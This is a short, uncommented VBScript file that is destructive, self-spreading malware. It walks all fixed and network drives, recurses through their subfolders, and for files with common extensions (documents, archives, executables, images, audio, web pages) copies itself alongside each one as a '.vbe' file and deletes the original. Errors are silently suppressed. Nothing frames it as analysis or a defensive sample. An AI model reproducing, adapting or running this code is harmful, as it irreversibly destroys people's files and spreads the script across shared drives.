haha()
Sub haha()
On Error Resume Next
Dim d, dc, s, fso, haha
Set fso = CreateObject("Scripting.FileSystemObject")
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
hihi (d.Path & "\")
End If
Next
haha = s
End sub
Sub hehe(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, s, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
If (ext = "zip") or (ext = "exe") or (ext = "com") or (ext = "rar") or (ext = "doc") or (ext = "xls") or (ext = "dll") or (ext = "txt") or (ext = "htm") or (ext = "html") or (ext = "jpg") or (ext = "bmp") or (ext = "mp3") or (ext = "mp4") or (ext = "gif") or (ext = "ink") Then
Set f = fso.getfile(wscript.scriptfullname)
f.Copy (f1.Path & ".vbe")
fso.deletefile(f1.path)
End If
Next
End Sub
Sub hihi(folderspec)
On Error Resume Next
Dim f, f1, sf, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
hehe (f1.Path)
hihi (f1.Path)
Next
End Sub